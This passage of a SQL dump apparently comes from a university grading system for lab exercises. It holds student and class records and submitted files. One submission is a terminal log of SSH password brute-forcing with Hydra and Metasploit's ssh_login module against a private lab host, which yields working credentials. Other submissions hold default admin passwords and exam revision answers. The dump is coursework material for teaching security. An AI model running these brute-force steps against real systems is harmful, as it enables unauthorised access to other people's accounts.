(4, 1, 4, 14, 17, 23, ''),
(5, 1, 5, 22, 20, 33, ''),
(6, 2, 1, 25, 15, 40, ''),
(7, 2, 2, 26, 22, 40, ''),
(8, 2, 3, 24, 16, 26, ''),
(9, 2, 4, 30, 28, 40, ''),
(10, 2, 5, 15, 15, 33, ''),
(11, 3, 1, 23, 24, 38, ''),
(12, 3, 2, 27, 22, 39, ''),
(13, 3, 3, 15, 15, 25, ''),
(14, 3, 4, 18, 18, 38, ''),
(15, 3, 5, 22, 23, 50, '');

-- --------------------------------------------------------

--
-- Table structure for table `scores`
--

CREATE TABLE `scores` (
  `id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `exercise_id` varchar(10) NOT NULL,
  `score` int(11) NOT NULL,
  `grade` varchar(2) NOT NULL,
  `status` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `scoring_criteria`
--

CREATE TABLE `scoring_criteria` (
  `id` int(11) NOT NULL,
  `scenario_id` int(11) NOT NULL,
  `grade_range_min` int(11) NOT NULL,
  `grade_range_max` int(11) NOT NULL,
  `grade` varchar(2) NOT NULL,
  `status` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `students`
--

CREATE TABLE `students` (
  `id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `student_id` varchar(50) NOT NULL,
  `is_archived` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `students`
--

INSERT INTO `students` (`id`, `user_id`, `student_id`, `is_archived`) VALUES
(1, 1, '23WMR09279', 0),
(2, 4, '23WMR09259', 0),
(3, 5, '23WMR10283', 0),
(4, 6, '23WMR09215', 0),
(5, 7, '23WMR08983', 0),
(6, 9, '23WMR09302', 0),
(7, 10, '23WMR10253', 0),
(8, 11, '23WMR10350', 0),
(9, 12, '23WMR09229', 0),
(10, 13, '23WMR09231', 0),
(11, 14, '23WMR09120', 0),
(12, 15, '23WMR09280', 0),
(13, 16, '23WMR09110', 0),
(14, 17, '23WMR09111', 0),
(15, 18, '23WMR09228', 0);

-- --------------------------------------------------------

--
-- Table structure for table `student_classes`
--

CREATE TABLE `student_classes` (
  `student_id` int(11) NOT NULL,
  `class_name` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `student_classes`
--

INSERT INTO `student_classes` (`student_id`, `class_name`) VALUES
(1, 'RIS3S2G7'),
(2, 'RIS3S2G7'),
(3, 'RIS3S2G7'),
(4, 'RIS3S2G5'),
(5, 'DFT2S1G5'),
(6, 'RSD3S2G3'),
(7, 'RIS3S2G7'),
(8, 'RIS3S2G7'),
(9, 'RIS3S2G7'),
(10, 'RIS3S2G6'),
(11, 'RIS3S2G6'),
(12, 'DFT2S1G5'),
(13, 'DFT2S1G5'),
(14, 'RIS3S2G5'),
(15, 'RIS3S2G6');

-- --------------------------------------------------------

--
-- Table structure for table `submitted_files`
--

CREATE TABLE `submitted_files` (
  `file_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `exercise_id` varchar(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `file_content` longtext NOT NULL,
  `submission_date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `submitted_files`
--

INSERT INTO `submitted_files` (`file_id`, `student_id`, `exercise_id`, `file_name`, `file_content`, `submission_date`) VALUES
(1, 1, 'sshOA1', 'command_log_20241124_024144.txt', 'Script started on 2024-11-24 02:41:44-05:00 [COMMAND=\"bash\" TERM=\"xterm-256color\" TTY=\"/dev/pts/0\" COLUMNS=\"77\" LINES=\"27\"]\n[~]\n\n$ yhydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:14\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[ERROR] File for logins not found: users.txt\n\n[~]\n\n$ cd /Desktop\n\nbash: cd: /Desktop: No such file or directory\n\n[~]\n\n$ cd /Desktop~/Desktop\n\n\n[~/Desktop]\n$ hydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:45\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task\n[DATA] attacking ssh://192.168.43.133:22/\n[22][ssh] host: 192.168.43.133   login: yiyangtan   password: kali\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 02:44:50\n\n[~/Desktop]\n$ msfconsole\nmsfconsole\n\nMetasploit tip: Use sessions -1 to interact with the last opened session\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] starting the Metasploit Framework console...|\n[*] STarting the Metasploit Framework console.../\n[*] StArting the Metasploit Framework console...-\n[*] StaRting the Metasploit Framework console...\\\n[*] StarTing the Metasploit Framework console...|\n[*] StartIng the Metasploit Framework console.../\n[*] StartiNg the Metasploit Framework console...-\n[*] StartinG the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting The Metasploit Framework console.../\n[*] Starting tHe Metasploit Framework console...-\n[*] Starting thE Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting the metasploit Framework console.../\n[*] Starting the MEtasploit Framework console...-\n[*] Starting the MeTasploit Framework console...\\\n[*] Starting the MetAsploit Framework console...|\n[*] Starting the MetaSploit Framework console.../\n[*] Starting the MetasPloit Framework console...-\n[*] Starting the MetaspLoit Framework console...\\\n[*] Starting the MetasplOit Framework console...|\n[*] Starting the MetasploIt Framework console.../\n[*] Starting the MetasploiT Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit framework console...|\n[*] Starting the Metasploit FRamework console.../\n[*] Starting the Metasploit FrAmework console...-\n[*] Starting the Metasploit FraMework console...\\\n[*] Starting the Metasploit FramEwork console...|\n[*] Starting the Metasploit FrameWork console.../\n[*] Starting the Metasploit FramewOrk console...-\n[*] Starting the Metasploit FramewoRk console...\\\n[*] Starting the Metasploit FrameworK console...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework Console...-\n[*] Starting the Metasploit Framework cOnsole...\\\n[*] Starting the Metasploit Framework coNsole...|\n[*] Starting the Metasploit Framework conSole.../\n[*] Starting the Metasploit Framework consOle...-\n[*] Starting the Metasploit Framework consoLe...\\\n[*] Starting the Metasploit Framework consolE...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n\n                                                  \nCall trans opt: received. 2-19-98 13:24:18 REC:Loc\n\n     Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;\' /\n                         `.  ,\'/ .\'\n                          `. X /.\'\n                .-;--\'\'--.._` ` (\n              .\'            /   `\n             ,           ` \'   Q \'\n             ,         ,   `._    \\\n          ,.|         \'     `-.;_\'\n          :  . `  ;    `  ` --,.._;\n           \' `    ,   )   .\'\n              `._ ,  \'   /_\n                 ; ,\'\'-,;\' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n       =[ metasploit v6.4.9-dev                           ]\n+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]\n+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > search ssh\n\n\nMatching Modules\n================\n\n   #    Name                                                               Disclosure Date  Rank       Check  Description\n   -    ----                                                               ---------------  ----       -----  -----------\n   0    exploit/linux/http/alienvault_exec                                 2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution\n   1    auxiliary/scanner/ssh/apache_karaf_command_execution               2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution\n   2    auxiliary/scanner/ssh/karaf_login                                  .                normal     No     Apache Karaf Login Utility\n   3    exploit/apple_ios/ssh/cydia_default_ssh                            2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability\n   4    exploit/unix/ssh/arista_tacplus_shell                              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)\n   5    exploit/unix/ssh/array_vxag_vapv_privkey_privesc                   2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution\n   6    exploit/linux/ssh/ceragon_fibeair_known_privkey                    2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure\n   7    auxiliary/scanner/ssh/cerberus_sftp_enumusers                      2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration\n   8    auxiliary/dos/cisco/cisco_7937g_dos                                2020-06-02       normal     No     Cisco 7937G Denial-of-Service Attack\n   9    auxiliary/admin/http/cisco_7937g_ssh_privesc                       2020-06-02       normal     No     Cisco 7937G SSH Privilege Escalation\n   10   exploit/linux/http/cisco_asax_sfr_rce                              2022-06-22       excellent  Yes    Cisco ASA-X with FirePOWER Services Authenticated Command Injection\n   11     \\_ target: Shell Dropper                                         .                .          .      .\n   12     \\_ target: Linux Dropper                                         .                .          .      .\n   13   auxiliary/scanner/http/cisco_firepower_login                       .                normal     No     Cisco Firepower Management Console 6.0 Login\n   14   exploit/linux/ssh/cisco_ucs_scpuser                                2019-08-21       excellent  No     Cisco UCS Director default scpuser password\n   15   auxiliary/scanner/ssh/eaton_xpert_backdoor                         2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner\n   16   exploit/linux/ssh/exagrid_known_privkey                            2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password\n   17   exploit/linux/ssh/f5_bigip_known_privkey                           2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure\n   18   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684   2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.\n   19   auxiliary/scanner/ssh/fortinet_backdoor                            2016-01-09       normal     No     Fortinet SSH Backdoor Scanner\n   20   post/windows/manage/forward_pageant                                .                normal     No     Forward SSH Agent Requests To Remote Pageant\n   21   exploit/windows/ssh/freeftpd_key_exchange                          2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow\n   22     \\_ target: Windows 2000 SP0-SP4 English                          .                .          .      .\n   23     \\_ target: Windows 2000 SP0-SP4 German                           .                .          .      .\n   24     \\_ target: Windows XP SP0-SP1 English                            .                .          .      .\n   25     \\_ target: Windows XP SP2 English                                .                .          .      .\n   26   exploit/windows/ssh/freesshd_key_exchange                          2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow\n   27     \\_ target: Windows 2000 Pro SP4 English                          .                .          .      .\n   28     \\_ target: Windows XP Pro SP0 English                            .                .          .      .\n   29     \\_ target: Windows XP Pro SP1 English                            .                .          .      .\n   30   exploit/windows/ssh/freesshd_authbypass                            2010-08-11       excellent  Yes    Freesshd Authentication Bypass\n   31     \\_ target: PowerShell                                            .                .          .      .\n   32     \\_ target: CmdStager upload                                      .                .          .      .\n   33   auxiliary/scanner/http/gitlab_user_enum                            2014-11-21       normal     No     GitLab User Enumeration\n   34   exploit/multi/http/gitlab_shell_exec                               2013-11-04       excellent  Yes    Gitlab-shell Code Execution\n   35     \\_ target: Linux                                                 .                .          .      .\n   36     \\_ target: Linux (x64)                                           .                .          .      .\n   37     \\_ target: Unix (CMD)                                            .                .          .      .\n   38     \\_ target: Python                                                .                .          .      .\n   39   exploit/linux/ssh/ibm_drm_a3user                                   2020-04-21       excellent  No     IBM Data Risk Manager a3user Default Password\n   40   post/windows/manage/install_ssh                                    .                normal     No     Install OpenSSH for Windows\n   41   payload/generic/ssh/interact                                       .                normal     No     Interact with Established SSH Connection\n   42   post/multi/gather/jenkins_gather                                   .                normal     No     Jenkins Credential Collector\n   43   auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner\n   44   exploit/freebsd/http/junos_phprc_auto_prepend_file                 2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE\n   45     \\_ target: PHP In-Memory                                         .                .          .      .\n   46     \\_ target: Interactive SSH with jail break                       .                .          .      .\n   47   auxiliary/scanner/ssh/detect_kippo                                 .                normal     No     Kippo SSH Honeypot Detector\n   48   post/linux/gather/enum_network                                     .                normal     No     Linux Gather Network Information\n   49   exploit/linux/local/ptrace_traceme_pkexec_helper                   2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit\n   50   exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey         2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure\n   51   exploit/multi/http/git_submodule_command_exec                      2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117\n   52   exploit/linux/ssh/mercurial_ssh_exec                               2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec\n   53   exploit/linux/ssh/microfocus_obr_shrboadmin                        2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password\n   54   post/multi/gather/ssh_creds                                        .                normal     No     Multi Gather OpenSSH PKI Credentials Collection\n   55   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow\n   56     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .\n   57     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .\n   58   auxiliary/gather/prometheus_api_gather                             2016-07-01       normal     No     Prometheus API Information Gather\n   59   exploit/windows/ssh/putty_msg_debug                                2002-12-16       normal     No     PuTTY Buffer Overflow\n   60     \\_ target: Windows 2000 SP4 English                              .                .          .      .\n   61     \\_ target: Windows XP SP2 English                                .                .          .      .\n   62     \\_ target: Windows 2003 SP1 English                              .                .          .      .\n   63   post/windows/gather/enum_putty_saved_sessions                      .                normal     No     PuTTY Saved Sessions Enumeration Module\n   64   auxiliary/gather/qnap_lfi                                          2019-11-25       normal     Yes    QNAP QTS and Photo Station Local File Inclusion\n   65   exploit/linux/ssh/quantum_dxi_known_privkey                        2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure\n   66   exploit/linux/ssh/quantum_vmpro_backdoor                           2014-03-17       excellent  No     Quantum vmPRO Backdoor Command\n   67   auxiliary/fuzzers/ssh/ssh_version_15                               .                normal     No     SSH 1.5 Version Fuzzer\n   68   auxiliary/fuzzers/ssh/ssh_version_2                                .                normal     No     SSH 2.0 Version Fuzzer\n   69   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                          .                normal     No     SSH Key Exchange Init Corruption\n   70   post/linux/manage/sshkey_persistence                               .                excellent  No     SSH Key Persistence\n   71   post/windows/manage/sshkey_persistence                             .                good       No     SSH Key Persistence\n   72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner\n   73   auxiliary/scanner/ssh/ssh_identify_pubkeys                         .                normal     No     SSH Public Key Acceptance Scanner\n   74   auxiliary/scanner/ssh/ssh_login_pubkey                             .                normal     No     SSH Public Key Login Scanner\n   75   exploit/multi/ssh/sshexec                                          1999-01-01       manual     No     SSH User Code Execution\n   76     \\_ target: Linux Command                                         .                .          .      .\n   77     \\_ target: Linux x86                                             .                .          .      .\n   78     \\_ target: Linux x64                                             .                .          .      .\n   79     \\_ target: Linux armle                                           .                .          .      .\n   80     \\_ target: Linux mipsle                                          .                .          .      .\n   81     \\_ target: Linux mipsbe                                          .                .          .      .\n   82     \\_ target: Linux aarch64                                         .                .          .      .\n   83     \\_ target: OSX x86                                               .                .          .      .\n   84     \\_ target: OSX x64                                               .                .          .      .\n   85     \\_ target: BSD x86                                               .                .          .      .\n   86     \\_ target: BSD x64                                               .                .          .      .\n   87     \\_ target: Python                                                .                .          .      .\n   88     \\_ target: Unix Cmd                                              .                .          .      .\n   89     \\_ target: Interactive SSH                                       .                .          .      .\n   90   auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration\n   91     \\_ action: Malformed Packet                                      .                .          .      Use a malformed packet\n   92     \\_ action: Timing Attack                                         .                .          .      Use a timing attack\n   93   auxiliary/fuzzers/ssh/ssh_version_corrupt                          .                normal     No     SSH Version Corruption\n   94   auxiliary/scanner/ssh/ssh_version                                  .                normal     No     SSH Version Scanner\n   95   post/multi/gather/saltstack_salt                                   .                normal     No     SaltStack Salt Information Gatherer\n   96   exploit/unix/http/schneider_electric_net55xx_encoder               2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder\n   97   exploit/windows/ssh/securecrt_ssh1                                 2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow\n   98   exploit/linux/ssh/solarwinds_lem_exec                              2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution\n   99   exploit/linux/http/sourcegraph_gitserver_sshcmd                    2022-02-18       excellent  Yes    Sourcegraph gitserver sshCommand RCE\n   100    \\_ target: Automatic                                             .                .          .      .\n   101    \\_ target: Unix Command                                          .                .          .      .\n   102    \\_ target: Linux Dropper                                         .                .          .      .\n   103  exploit/linux/ssh/symantec_smg_ssh                                 2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability\n   104  exploit/linux/http/symantec_messaging_gateway_exec                 2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution\n   105  exploit/windows/ssh/sysax_ssh_username                             2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow\n   106    \\_ target: Sysax 5.53 on Win XP SP3 / Win2k3 SP0                 .                .          .      .\n   107    \\_ target: Sysax 5.53 on Win2K3 SP1/SP2                          .                .          .      .\n   108  auxiliary/dos/windows/ssh/sysax_sshd_kexchange                     2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service\n   109  exploit/unix/ssh/tectia_passwd_changereq                           2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability\n   110  auxiliary/scanner/ssh/ssh_enum_git_keys                            .                normal     No     Test SSH Github Access\n   111  exploit/linux/http/ubiquiti_airos_file_upload                      2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload\n   112  payload/cmd/unix/reverse_ssh                                       .                normal     No     Unix Command Shell, Reverse TCP SSH\n   113  payload/cmd/unix/bind_aws_instance_connect                         .                normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)\n   114  exploit/linux/ssh/vmware_vrni_known_privkey                        2023-08-29       excellent  No     VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure\n   115    \\_ target: 6.0_platform                                          .                .          .      .\n   116    \\_ target: 6.0_proxy                                             .                .          .      .\n   117    \\_ target: 6.1_platform                                          .                .          .      .\n   118    \\_ target: 6.1_proxy                                             .                .          .      .\n   119    \\_ target: 6.2_collector                                         .                .          .      .\n   120    \\_ target: 6.2_platform                                          .                .          .      .\n   121    \\_ target: 6.3_collector                                         .                .          .      .\n   122    \\_ target: 6.3_platform                                          .                .          .      .\n   123    \\_ target: 6.4_collector                                         .                .          .      .\n   124    \\_ target: 6.4_platform                                          .                .          .      .\n   125    \\_ target: 6.5_collector                                         .                .          .      .\n   126    \\_ target: 6.5_platform                                          .                .          .      .\n   127    \\_ target: 6.6_collector                                         .                .          .      .\n   128    \\_ target: 6.6_platform                                          .                .          .      .\n   129    \\_ target: 6.7_collector                                         .                .          .      .\n   130    \\_ target: 6.7_platform                                          .                .          .      .\n   131    \\_ target: 6.8_collector                                         .                .          .      .\n   132    \\_ target: 6.8_platform                                          .                .          .      .\n   133    \\_ target: 6.9_collector                                         .                .          .      .\n   134    \\_ target: 6.9_platform                                          .                .          .      .\n   135    \\_ target: 6.10_collector                                        .                .          .      .\n   136    \\_ target: 6.10_platform                                         .                .          .      .\n   137    \\_ target: All                                                   .                .          .      .\n   138  exploit/linux/ssh/vmware_vdp_known_privkey                         2016-12-20       excellent  No     VMware VDP Known SSH Key\n   139  exploit/multi/http/vmware_vcenter_uploadova_rce                    2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE\n   140    \\_ target: VMware vCenter Server <= 6.7 Update 1b (Linux)        .                .          .      .\n   141    \\_ target: VMware vCenter Server <= 6.7 Update 3j (Windows)      .                .          .      .\n   142  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation\n   143  post/windows/gather/credentials/whatsupgold_credential_dump        2022-11-22       manual     No     WhatsUp Gold Credentials Dump\n   144    \\_ action: Decrypt                                               .                .          .      Decrypt WhatsUp Gold database export CSV file\n   145    \\_ action: Dump                                                  .                .          .      Export WhatsUp Gold database and perform decryption\n   146    \\_ action: Export                                                .                .          .      Export WhatsUp Gold database without decryption\n   147  post/windows/gather/credentials/mremote                            .                normal     No     Windows Gather mRemote Saved Password Extraction\n   148  exploit/windows/local/unquoted_service_path                        2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation\n   149  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                        2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm\n   150    \\_ target: Unix Command                                          .                .          .      .\n   151    \\_ target: Linux Dropper                                         .                .          .      .\n   152    \\_ target: Interactive SSH                                       .                .          .      .\n   153  auxiliary/scanner/ssh/libssh_auth_bypass                           2018-10-16       normal     No     libssh Authentication Bypass Scanner\n   154    \\_ action: Execute                                               .                .          .      Execute a command\n   155    \\_ action: Shell                                                 .                .          .      Spawn a shell\n   156  exploit/linux/http/php_imap_open_rce                               2018-10-23       good       Yes    php imap_open Remote Code Execution\n   157    \\_ target: prestashop                                            .                .          .      .\n   158    \\_ target: suitecrm                                              .                .          .      .\n   159    \\_ target: e107v2                                                .                .          .      .\n   160    \\_ target: Horde IMP H3                                          .                .          .      .\n   161    \\_ target: custom                                                .                .          .      .\n\n\nInteract with a module by name or index. For example info 161, use 161 or use exploit/linux/http/php_imap_open_rce\nAfter interacting with a module you can manually set a TARGET with set TARGET \'custom\'\n\nmsf6 > use auxiliary/scanner/ssh/ssh_login\n\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.43.133\n\nrhosts => 192.168.43.133\nmsf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true\n\nstop_on_success => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt\n\nuser_file => users.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt\n\npass_file => passwords.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set verbose true\n\nverbose => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n\n\n[*] 192.168.43.133:22 - Starting bruteforce\n[-] 192.168.43.133:22 - Failed: \'kali:admin\'\n[!] No active DB -- Credential data will not be saved!\n[-] 192.168.43.133:22 - Failed: \'kali:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'kali:abc123\'\n[-] 192.168.43.133:22 - Failed: \'kali:kali\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:admin\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:abc123\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:kali\'\n[-] 192.168.43.133:22 - Failed: \'admin:admin\'\n[-] 192.168.43.133:22 - Failed: \'admin:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'admin:abc123\'\n[-] 192.168.43.133:22 - Failed: \'admin:kali\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:admin\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:abc123\'\n[+] 192.168.43.133:22 - Success: \'yiyangtan:kali\' \'\'\n[*] SSH session 1 opened (192.168.43.130:36359 -> 192.168.43.133:22) at 2024-11-24 02:46:41 -0500\n[-] 192.168.43.133:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with \'set gatherproof false\'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit\n\n[*] You have active sessions open, to exit anyway type \"exit -y\"\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit -y\n\n\n[~/Desktop]\n$ exit\n\nexit\n\nScript done on 2024-11-24 02:48:08-05:00 [COMMAND_EXIT_CODE=\"0\"]\n\n', '2024-12-03 06:25:52'),
(2, 1, 'sshOA2', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 06:26:17'),
(3, 1, 'sshOB1', 'BAIT3113 System Administration PYP.txt', 'BAIT3113 System Administration PYP\r\n===================================\r\n5 JUNE 2024\r\n===========\r\nQuestion 1\r\na) There are two basic types of users in Linux - namely super and regular user.\r\n(i) Explain the difference between super user and regular user.\r\nANS:\r\nSuper user\r\n- The super user in Linux, often called root, has unrestricted access to the entire system.\r\n- They can perform all administrative task, including installing software, managing files, creating users, and altering system settings.\r\n- The super user can override any file permissions, meaning they have full control over all resources and configuration on the system.\r\n\r\nRegular user\r\n- A regular user has limited access to the system and  is typically restricted to their own home directory and files.\r\n- They can perform basic tasks like editing files, running applications, and creating personal directories, but cannot perform administrative functions.\r\n- To perform administrative tasks, regular users must use commands like sudo, which temporarily grants them elevated privileges for specific actions.\r\n\r\n(ii)In Linux system, the sudo command plays a crucial role in managing user privileges. Do you agree with the statement? Justify your answer with an appropriate example.\r\nANS:\r\n- Yes, I agree that the sudo command plays a crucial role in managing user privileges in a Linux system.\r\n- The sudo command allows a regular user to execute commands that typically require super user(root) privileges, without having to log in as the root user.\r\n- This enhances security by limiting root access and provides more control over which users can perform administrative tasks.\r\n- Example, if a user wants to update the system, which requires root privileges, they can use the sudo command as follows: sudo apt-get update\r\n\r\n\r\nb) User management includes everything from creating a user to deleting a user on your system. Write the Linux command(s) to accomplish the following user management tasks:\r\n(i) Create a user with the following requirements:\r\n    - The user login name is \"alice\"\r\n    - The user \"alice\" joined \"webuser\" group as her primary group.\r\n    - Default home to be created for user \"alice\" to park under /home/alice directory.\r\nANS:\r\nsudo useradd -m -g webuser alice\r\n\r\n(ii) Modify the user \"alice\" account properties based on the following requirements:\r\n    * Change the user \"alice\" home from /home/alice directory to /data/alice directory.\r\n    * Change the user \"alice\" user ID (UID) from \"1023\" to \"7531\"\r\nANS:\r\nsudo usermod -d /data/alice -m -u alice\r\n\r\n(iii) Delete the account of user \"alice\" and her home directory as well.\r\nANS:\r\nsudo userdel -r alice\r\n\r\n\r\nc) In Linux system, Access Control List(ACL) is one of the most fundamental mechanism to secure file or directory.\r\n(i) Discuss the advantages of using ACL compared to standard file permissions.\r\nANS:\r\n*Efficiency\r\n  - ACL allows settings permissions for multiple users and groups on the same file or directory, offering more detailed control compared to the standard owner, group, and others model.\r\n\r\n*User-Specific Permissions\r\n  - ACL enables assigning specific permissions 